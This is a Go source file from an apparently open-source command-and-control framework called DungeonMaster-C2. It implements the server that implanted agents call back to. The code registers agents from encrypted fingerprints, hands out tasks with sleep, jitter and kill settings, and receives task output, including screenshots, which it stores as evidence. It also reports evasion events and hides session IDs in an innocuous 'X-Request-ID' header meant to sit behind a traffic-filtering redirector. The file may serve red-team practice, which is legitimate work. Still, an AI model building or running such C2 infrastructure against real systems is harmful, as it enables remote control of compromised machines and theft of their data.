package api

import (
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/tls"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"

	"github.com/BroJustLeaveMeAlone/DungeonMaster-C2/server/internal/collab"
	"github.com/BroJustLeaveMeAlone/DungeonMaster-C2/server/internal/db"
	"github.com/BroJustLeaveMeAlone/DungeonMaster-C2/server/internal/session"
	"github.com/BroJustLeaveMeAlone/DungeonMaster-C2/server/internal/storage"
	"go.uber.org/zap"
)

// C2Server handles raw agent callbacks over HTTPS.
// It runs on a separate port from the operator API and is designed to sit
// behind a redirector that validates the traffic profile before forwarding.
//
// Protocol (pull model):
//   POST /r  â€” agent registers (first contact)
//   GET  /c  â€” agent polls for tasks (carries session_id in encrypted header)
//   POST /c  â€” agent submits task output
type C2Server struct {
	sessions *session.Manager
	bus      *collab.Bus
	log      *zap.Logger
	mux      *http.ServeMux
}

// agentHeader is the name of the custom header carrying the encrypted session ID.
// The value is AES-GCM encrypted with the session key and base64url encoded.
// In production this would be a configurable malleable profile field.
const agentHeader = "X-Request-ID"

func NewC2Server(sessions *session.Manager, bus *collab.Bus, log *zap.Logger) *http.Server {
	s := &C2Server{
		sessions: sessions,
		bus:      bus,
		log:      log,
		mux:      http.NewServeMux(),
	}
	regPath  := envOrC2("DM_C2_PATH_REG", "/r")
	pollPath := envOrC2("DM_C2_PATH_POLL", "/c")
	s.mux.HandleFunc(regPath, s.handleRegister)
	s.mux.HandleFunc(pollPath, s.handleCallback)
	s.mux.HandleFunc("/download/", s.handleDownload)

	logged := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		log.Info("c2 http request", zap.String("method", r.Method), zap.String("path", r.URL.Path), zap.String("remote", r.RemoteAddr))
		s.mux.ServeHTTP(w, r)
	})

	return &http.Server{
		Handler: logged,
		TLSConfig: &tls.Config{
			MinVersion: tls.VersionTLS12,
		},
	}
}

// ListenAndServeTLS is a helper to start the C2 server with TLS.
func (s *C2Server) ListenAndServeTLS(addr, certFile, keyFile string) error {
	srv := &http.Server{
		Addr:    addr,
		Handler: s.mux,
		TLSConfig: &tls.Config{
			MinVersion: tls.VersionTLS12,
		},
	}
	return srv.ListenAndServeTLS(certFile, keyFile)
}

// handleRegister processes the first contact from a new agent.
// The agent sends its environment fingerprint and ECDH public key.
// The server responds with session credentials and the server's ECDH public key.
func (s *C2Server) handleRegister(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.NotFound(w, r)
		return
	}

	body, err := io.ReadAll(io.LimitReader(r.Body, 64*1024))
	if err != nil {
		s.log.Warn("c2: register: read body", zap.Error(err))
		http.Error(w, "", http.StatusBadRequest)
		return
	}

	if key := c2RegKey(); key != nil {
		var decErr error
		body, decErr = c2AESDecrypt(key, body)
		if decErr != nil {
			http.NotFound(w, r)
			return
		}
	}

	var req session.RegisterRequest
	if err := json.Unmarshal(body, &req); err != nil {
		s.log.Warn("c2: register: unmarshal", zap.Error(err))
		http.Error(w, "", http.StatusBadRequest)
		return
	}

	req.IPExternal = extractIP(r)

	resp, err := s.sessions.Register(r.Context(), req)
	if err != nil {
		s.log.Error("c2: register: session manager", zap.Error(err))
		http.Error(w, "", http.StatusInternalServerError)
		return
	}

	// Notify operators
	go s.bus.Publish(r.Context(), collab.NewSessionCheckinEvent(req.CampaignID, resp.SessionID))

	w.Header().Set("Content-Type", "application/octet-stream")
	json.NewEncoder(w).Encode(resp)
}

// handleCallback handles the agent's polling loop.
// GET  â€” poll for pending tasks
// POST â€” submit task output
func (s *C2Server) handleCallback(w http.ResponseWriter, r *http.Request) {
	// Extract and validate session ID from encrypted header
	// Phase 1: session ID sent as plaintext in X-Request-ID for simplicity
	sessionID := r.Header.Get(agentHeader)
	if sessionID == "" {
		http.NotFound(w, r)
		return
	}

	hb, err := s.sessions.Heartbeat(r.Context(), sessionID)
	if err != nil {
		s.log.Warn("c2: heartbeat failed", zap.String("session_id", sessionID), zap.Error(err))
		http.NotFound(w, r)
		return
	}

	switch r.Method {
	case http.MethodGet:
		s.handlePoll(w, r, sessionID, hb)
	case http.MethodPost:
		s.handleOutput(w, r, sessionID)
	default:
		http.NotFound(w, r)
	}
}

func (s *C2Server) handlePoll(w http.ResponseWriter, r *http.Request, sessionID string, hb session.HeartbeatResult) {
	type pollResponse struct {
		Tasks        []session.Task `json:"tasks"`
		SleepSeconds int            `json:"sleep_seconds"`
		JitterPct    int            `json:"jitter_pct"`
		Kill         bool           `json:"kill"`
	}

	resp := pollResponse{
		SleepSeconds: hb.SleepSeconds,
		JitterPct:    hb.JitterPct,
		Kill:         hb.Kill,
	}

	if !hb.Kill && !hb.Revoked {
		tasks, err := s.sessions.PendingTasks(r.Context(), sessionID)
		if err != nil {
			s.log.Error("c2: pending tasks", zap.Error(err))
		} else {
			resp.Tasks = tasks
		}
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(resp)
}

func (s *C2Server) handleOutput(w http.ResponseWriter, r *http.Request, sessionID string) {
	body, err := io.ReadAll(io.LimitReader(r.Body, 256*1024*1024))
	if err != nil {
		http.Error(w, "", http.StatusBadRequest)
		return
	}

	var req session.CompleteTaskRequest
	if err := json.Unmarshal(body, &req); err != nil {
		http.Error(w, "", http.StatusBadRequest)
		return
	}
	req.SessionID = sessionID

	if err := s.sessions.CompleteTask(r.Context(), req); err != nil {
		s.log.Error("c2: complete task", zap.Error(err))
		http.Error(w, "", http.StatusInternalServerError)
		return
	}

	// Notify operators of task output
	sess, _ := s.sessions.Get(r.Context(), sessionID)
	if sess != nil {
		ev := collab.NewTaskOutputEvent(sess.CampaignID, sessionID, req.TaskID, req.Output)
		go s.bus.Publish(r.Context(), ev)

		if req.EvasionEvent {
			evasionEv := collab.NewEvasionEvent(
				sess.CampaignID, sessionID, req.TaskID, req.EvasionDescription,
			)
			go s.bus.Publish(r.Context(), evasionEv)
		}

		// Store evidence in MinIO and record in evidence table
		if len(req.Output) > 0 {
			go s.storeEvidence(sess, req.TaskID, req.Output)
		}
	}

	w.WriteHeader(http.StatusNoContent)
}

func (s *C2Server) storeEvidence(sess *session.Session, taskID string, output []byte) {
	storeEvidence(s.log, sess, taskID, output)
}

func storeEvidence(log *zap.Logger, sess *session.Session, taskID string, output []byte) {
	ctx := context.Background()
	contentType, ext, evidenceType := inferContentType(output)
	objectName := fmt.Sprintf("%s/%s%s", sess.ID, taskID, ext)
	url, err := storage.UploadBytes(ctx, storage.BucketEvidence, objectName, output, contentType)
	if err != nil {
		log.Warn("evidence upload failed", zap.String("task_id", taskID), zap.Error(err))
		return
	}

	var campaignID *string
	if sess.CampaignID != "" {
		campaignID = &sess.CampaignID
	}

	_, err = db.Pool.Exec(ctx, `
		INSERT INTO evidence (campaign_id, session_id, task_id, type, url, filename)
		VALUES ($1, $2, $3, $4, $5, $6)`,
		campaignID, sess.ID, taskID, evidenceType, url, taskID+ext,
	)
	if err != nil {
		log.Warn("evidence record failed", zap.String("task_id", taskID), zap.Error(err))
	}
}

func inferContentType(data []byte) (contentType, ext, evidenceType string) {
	if len(data) >= 2 && data[0] == 'B' && data[1] == 'M' {
		return "image/bmp", ".bmp", "screenshot"
	}
	return "application/octet-stream", ".bin", "task_output"
}

func c2RegKey() []byte {
	h := os.Getenv("DM_REG_KEY")
	if len(h) != 64 || h == strings.Repeat("0", 64) {
		return nil
	}
	key, err := hex.DecodeString(h)
	if err != nil || len(key) != 32 {
		return nil
	}
	return key
}

func c2AESDecrypt(key, data []byte) ([]byte, error) {
	if len(data) < 28 {
		return nil, fmt.Errorf("ciphertext too short")
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	return gcm.Open(nil, data[:12], data[12:], nil)
}

func envOrC2(key, fallback string) string {
	if v := os.Getenv(key); v != "" {
		return v
	}
	return fallback
}

func extractIP(r *http.Request) string {
	if xff := r.Header.Get("X-Forwarded-For"); xff != "" {
		return xff
	}
	host, _, _ := splitHostPort(r.RemoteAddr)
	return host
}

func splitHostPort(addr string) (host, port string, err error) {
	host = addr
	for i := len(addr) - 1; i >= 0; i-- {
		if addr[i] == ':' {
			host = addr[:i]
			port = addr[i+1:]
			return
		}
	}
	return
}
